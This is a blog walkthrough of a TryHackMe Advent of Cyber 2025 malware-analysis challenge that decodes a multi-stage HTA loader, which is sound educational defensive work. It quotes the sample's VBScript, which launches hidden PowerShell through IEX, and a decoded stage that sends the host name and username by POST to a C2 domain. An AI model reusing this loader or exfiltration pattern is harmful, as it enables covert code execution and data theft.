+++
title = "Advent of Cyber 2025 Day 21 — Malware Analysis Bonus Challenge"
date = 2025-12-21T23:39:55-07:00
draft = false
summary = "A walkthrough of the TryHackMe Advent of Cyber 2025 Day 21 bonus challenge: peeling back a multi-layer HTA payload through VBScript analysis, Base64 decoding, and XOR decryption to uncover a hidden PNG."
tags = ["deobfuscation-lab", "malware-analysis", "vbscript", "powershell", "xor", "base64", "tryhackme"]
series = ["Deobfuscation Lab"]
canonicalURL = "https://medium.com/@mattcswann/advent-of-cyber-2025-day-21-malware-analysis-bonus-challenge-553b37d78530"
+++

This writeup covers the bonus challenge at the end of Day 21 — "Malware Analysis — Malhare.exe" — which, when completed, provides a key for one of the Side Quests in Advent of Cyber 2025. I found this a genuinely fun challenge for anyone new to malware reverse engineering, and wanted to share the process end-to-end.

## Analyzing the original HTA file

The challenge starts by having you download and unzip `NorthPole.zip`, which contains an HTA file named `NorthPolePerformanceReview.hta`. We can open it with `pluma` the same way as the walkthrough challenge:

```bash
pluma NorthPolePerformanceReview.hta
```

Near the very top, the file identifies itself as VBScript immediately:

```vbscript
<script language="VBScript">
```

Below that, a variable `p` is set as a very long string of concatenated Base64 chunks:

```vbscript
<html>
  <head>
    <title>North Pole Performance Review 2025</title>
    <HTA:APPLICATION ID="Perf"
                     APPLICATIONNAME="North Pole Performance Review"
                     BORDER="dialog"
                     SHOWINTASKBAR="yes"
                     SINGLEINSTANCE="yes"
                     WINDOWSTATE="normal"></HTA:APPLICATION>
    <script language="VBScript">
      Option Explicit
      Dim s,c,p,fso,t,f
      p = "JGg9JGVudjpDT01QVVRFUk5BTUUKJHU9JGVudjpVU0VSTkFNRQokaz0yMwokZD0nbmtkWlVCb2REUjBYRnhjYVhsOVRSUmNYRllzWEZ4Uy9IeEVYRnhkcndETzlGeGMzRjE1VFZrTnZ6ZnVxYm84emNHS3c3SWs0Slh5NC9VS3F2cXpDelUxY2ZINDZIeDZXei9adEo1" & _
      "RVdkR1NxOW5yM0dad1FENXQycnlIM2ZHd1JlM1QwNW5sMERIU1kwTThVMFhlNTBIZDdGQlVXVlI5ZWY4akh6VXo2UW82Q1hHdnc2UVlHamtockRrN0taMHhWMTI2SUVFT0NBZzRPRGdZSzVweWs2eGtQa1hZUGtYWVBrWFlQa1hZUGtYWVBrWFlQa1hZUGtYWVBrWFlQ" & _
      . . . [SNIP] . . .
      "YWRlcnMgQHtIPSRoO1U9JHV9Cgo="
      Set fso = CreateObject("Scripting.FileSystemObject")
      t = fso.GetSpecialFolder(2)
      Set f = fso.CreateTextFile(t & "\\stg.b64", True)
      f.Write p
      f.Close
      Set s = CreateObject("WScript.Shell")
      c = "powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command ""$x=[System.IO.File]::ReadAllText((Join-Path $env:TEMP 'stg.b64')); $s=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($x)); IEX $s"""
      s.Run c,0,True
    </script>
  </head>
```

The key variable is `c`, which runs a suspicious encoded PowerShell command — but for this challenge we're primarily focused on decoding the Base64 in `p`. The logic the script follows is:

1. A `FileSystemObject` creates a temp file named `stg.b64` (the extension is your first clue)
2. The long Base64 string `p` is written to that file
3. PowerShell reads `stg.b64`, Base64-decodes it to a UTF-8 string, then runs it via `IEX`

Translation: we need to decode `p` manually to find out what actually executes.

## Step 1 — Consolidate the Base64 into a single string

The VBScript concatenates its Base64 payload across many lines using `" & _"` as a line continuation. We need to strip all of that syntax and join the fragments into one clean string.

Copy everything between the opening `"JGg9..."` and the final `"...Cgo="` into a file called `stage1.txt`, preserving the original line structure. Then use `tr` to strip the quotes, ampersands, underscores, and newlines:

```bash
tr -d '"\n&_ ' < stage1.txt > stage1_combined.txt
```

The result is a single unbroken Base64 string ready for decoding.

## Step 2 — Decode the first Base64 layer

Two approaches here — CyberChef or command line. Both get you to the same place; knowing both is useful.

### Via CyberChef

Getting a string this large to your clipboard from a VM can be unreliable with simple highlighting. Use `xclip` instead:

```bash
xclip -selection clipboard < stage1_combined.txt
```

Navigate to [CyberChef](https://gchq.github.io/CyberChef/), paste into the Input field, apply the **From Base64** recipe. The decoded output reveals a PowerShell script:

```powershell
$h=$env:COMPUTERNAME
$u=$env:USERNAME
$k=23
$d='nkdZUBodDR0X....[SNIP]...TuVV3lQ=='
$b=[System.Convert]::FromBase64String($d)
for($i=0;$i -lt $b.Length;$i++){$b[$i]=$b[$i] -bxor $k}
Invoke-WebRequest -Uri "https://perf.king-malhare[.]com/image" -Method POST -Body $b -Headers @{H=$h;U=$u}
```

A few things stand out immediately:

- `$k=23` is an XOR key
- `$d` is another Base64-encoded blob (note the `==` padding and the `FromBase64String` call on the next line)
- The decoded bytes are XOR'd against `$k` before being POSTed to the C2 domain

The attack chain is now clear: **Base64 → Base64 → XOR → final payload → C2 exfil**

If you went the CyberChef route, copy the Base64 string from `$d` (between the single quotes only) into a new file called `stage2.txt` and skip to Step 3.

### Via command line

```bash
base64 -d stage1_combined.txt > stage1_decoded.txt
nano stage1_decoded.txt
```

Confirm the contents match what CyberChef showed. Then isolate the `$d` value — grab line 4, strip the single quotes, and cut the `$d=` prefix:

```bash
sed -n '4p' stage1_decoded.txt | tr -d "'" | cut -c 4- > stage2.txt
```

Either path produces an identical `stage2.txt`.

## Step 3 — Decode the second Base64 layer and XOR

The attack plan for this step:

```
Base64 encoded data → Base64 decoded bytes → XOR with key 23 → Final output
```

First, sanity-check that `stage2.txt` decodes to something:

```bash
base64 -d stage2.txt > stage2.raw
file stage2.raw      # expect: "data" (unreadable until XOR'd)
wc -c stage2.raw     # expect: a non-zero byte count
```

Now apply the XOR. Python handles this cleanly in a one-liner:

```python
python3 - << 'EOF'
data = open("stage2.raw", "rb").read()
key = 23
out = bytes(b ^ key for b in data)
open("stage2.dec", "wb").write(out)
EOF
```

Then check what you got:

```bash
file stage2.dec
stage2.dec: PNG image data, 668 x 936, 8-bit/color RGBA, non-interlaced
```

The XOR'd bytes resolve to a PNG image. Open it to complete the challenge:

```bash
xdg-open stage2.dec
```

## The deobfuscation chain, summarized

What looked like an innocuous performance review document was actually a multi-stage loader:

| Stage | Technique | Tool |
|-------|-----------|------|
| HTA delivery | VBScript disguised as an HR doc | `pluma` |
| Stage 1 | Concatenated Base64 → PowerShell script | `tr`, `base64` / CyberChef |
| Stage 2 | Nested Base64 → raw bytes | `base64` |
| Stage 3 | XOR w/ key `23` → PNG payload | Python |
| Execution | `Invoke-WebRequest` POST to C2 | n/a (intercepted) |

The layering here — VBScript → Base64 → Base64 → XOR → final artifact — is a textbook example of how defenders get slowed down by obfuscation even when no novel technique is involved. Each individual step is trivial. Chained together, they buy the attacker time.

The counter is exactly what we did here: work methodically from the outside in, use the smallest useful tool at each step, and let each decoded layer tell you what comes next. The attacker's own code is always the best documentation of the attacker's intent.

---

Thanks for reading, and happy hunting.

*Originally published on [Medium](https://medium.com/@mattcswann/advent-of-cyber-2025-day-21-malware-analysis-bonus-challenge-553b37d78530).*
